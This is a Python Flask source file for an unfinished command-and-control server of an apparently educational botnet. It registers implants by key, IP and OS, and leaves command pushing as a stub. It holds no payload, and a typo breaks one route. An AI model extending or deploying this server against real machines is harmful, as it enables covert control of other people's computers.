from flask import Flask, url_for, request, redirect, jsonify, render_template, session 
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///edubotnet.sqlite3'
db = SQLAlchemy(app)

FIRSTCONTACTKEY = 'firstcontact'
# TODO: Change the register key to change dynamically 
REGISTERKEY = 'registerkey'

"""
def returnjson(*arg):
    # If the number of parameters are even number
    if len(arg) % 2 != 0:
        return '[-] Wrong number of parameters!!!'

    else:
        return jsonify({})
"""

class Bot(db.Model):
    #__tablename__ = 'bots'
    id = db.Column('bot_id', db.Integer, primary_key=True)
    ip = db.Column(db.String(128))
    os = db.Column(db.String(128))

    def __init__(self, ip, os):
        self.ip = ip 
        self.os = os

    def get_id(self):
        return self.id

    def get_ip(self):
        return self.ip

    def get_os(self):
        return self.os

    def get_info(self):
        info = 'Bot[' + str(self.id) + '] IP: ' + self.ip + ' OS: ' + self.os
        return info

    def jsonbot(self):
        # TODO: Create a function which returns a jsonify version of the bot information 
        pass 

def init_db():
    db.drop_all()
    db.create_all()

@app.route('/')
def hello_world():
    return "Hello, world!"

@app.route('/firstcontact', methods=['POST'])
def firstcontact(): 
    """
    Description: Endpoint which retrieves first contact from the bot. 
    
    [POST] 
        - (str) firstcontactkey : firstcontact key to identify if the 
        contact is coming from the implant or not 
    """

    if request.method != 'POST':
        return jsonify({'error': 'wrong HTTP method'})

    data = request.form

    print("[DEBUG] firstcontact data = ", data)

    try:
        if data is None:
            return jsonify({'result': 'firstcontactkey is required'})
        elif data['firstcontactkey'] is None:
            return jsonify({'result': 'wrong'})
        elif data['firstcontactkey'] != FIRSTCONTACTKEY:
            return jsonify({'result': 'wrong firstcontactkey'})
        
        elif data['firstcontactkey'] == FIRSTCONTACTKEY:
            return jsonify({'result': 'success', 'registerkey': 'registerkey'})


    except Exception as e:
        return ''

@app.route('/register', methods=['POST'])
def register():
    """
    Description: Register a new bot to the server 

    [POST] 
        - (str) registerkey = Register key that is needed for the registration process. 
        The key could be obtained through the firstcontact. 

        - (str) ip = IP address of the bot 
        - (str) os = OS type (Nix/Windows) of the bot 
    """
    if request.method != 'POST':
        return jsonify({'error': 'wrong HTTP method'})

    data = request.form
    registerkey = data['registerkey']
    bot_ip = data['ip']
    bot_os = data['os']

    print("[DEBUG] firstcontact data = ", data)

    try:
        if data is None:
            return jsonify({'error': 'Could not process body parameters'})
        if registerkey is None:
            return jsonify({'error': 'regsiterkey is required'})
        if bot_ip is None:
            return jsonify({'error': 'ip is required'})
        if bot_os is None:
            return jsonify({'error': 'os is required'})

        print("[DDEBUGGG] hello?!?!")
        print ("[DEBUG] registerkey = ", registerkey)
        print ("[DEBUG] ip = ", bot_ip)
        print ("[DEBUG] os = ", bot_os)
        
        try:
            """
            I was doing ip=ip, which is wrong, but flask was not
            giving any error messages. Lessons learned: if shit goes wrong, try using try/except for debugging 
            """
            query_bot = Bot.query.filter_by(ip=bot_ip).first()
        except Exception as e:
            print("[!]", e)

        if query_bot is not None:
            return jsonify({'error': 'Bot already registered'})

        else:
            print("[+] Added a new bot !")
            bot = Bot(bot_ip, bot_os)
            db.session.add(bot)
            db.session.commit()

            return jsonify({'result': 'Bot was added'})

    except Exception as e:
        return '' 

@appr.route('/bot/<id>/push', methods=['POST', 'PUT'])
def bottask(id):
    """
    TODO: This + cmd Model 
    Description: Pushes the command into the cmd Model. Remember to create cmd Model for the database!
    """
    pass


# TODO: Change to POST, implement master authentication for OPSEC 
@app.route('/bot/list', methods=['GET'])
def botlist():
    botlist = Bot.query.all()

    for bot in botlist:
        print(bot.get_info())

    #print(type(botlist))

    return ''


init_db()

if __name__ == '__main__':
    app.run()